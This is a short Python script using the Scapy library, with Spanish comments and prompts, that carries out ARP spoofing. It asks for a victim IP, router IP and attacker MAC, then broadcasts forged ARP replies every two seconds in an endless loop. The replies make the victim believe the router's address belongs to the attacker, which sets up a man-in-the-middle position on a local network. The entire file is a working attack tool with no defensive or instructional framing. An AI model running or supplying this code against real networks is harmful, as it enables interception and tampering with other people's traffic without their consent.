from scapy.all import ARP, Ether, sendp
import time

def arp_spoof(victim_ip, router_ip, attacker_mac):
    # Crear paquete ARP para la víctima
    # Esto indica a la víctima que la IP del router tiene la dirección MAC del atacante
    arp_victim = ARP(pdst=victim_ip, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Crear un paquete Ethernet con dirección MAC de broadcast
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    
    # Combinar los paquetes ARP y Ethernet
    packet_victim = ether / arp_victim

    # Imprimir mensaje de estado
    print(f"[*] Engañando a {victim_ip} para que crea que {router_ip} tiene la MAC {attacker_mac}")

    # Enviar el paquete en un bucle infinito para mantener el spoofing activo
    try:
        while True:
            sendp(packet_victim, verbose=False)  # Enviar el paquete ARP
            time.sleep(2)  # Esperar 2 segundos antes de enviar el siguiente paquete
    except KeyboardInterrupt:
        print("ARP spoofing detenido")

if __name__ == '__main__':
    # Solicitar la IP de la víctima
    victim_ip = input("Ingrese la IP de la víctima: ")
    
    # Solicitar la IP del router
    router_ip = input("Ingrese la IP del router: ")
    
    # Solicitar la MAC del atacante
    attacker_mac = input("Ingrese la dirección MAC del atacante: ")
    
    # Llamar a la función arp_spoof con los datos ingresados
    arp_spoof(victim_ip, router_ip, attacker_mac)
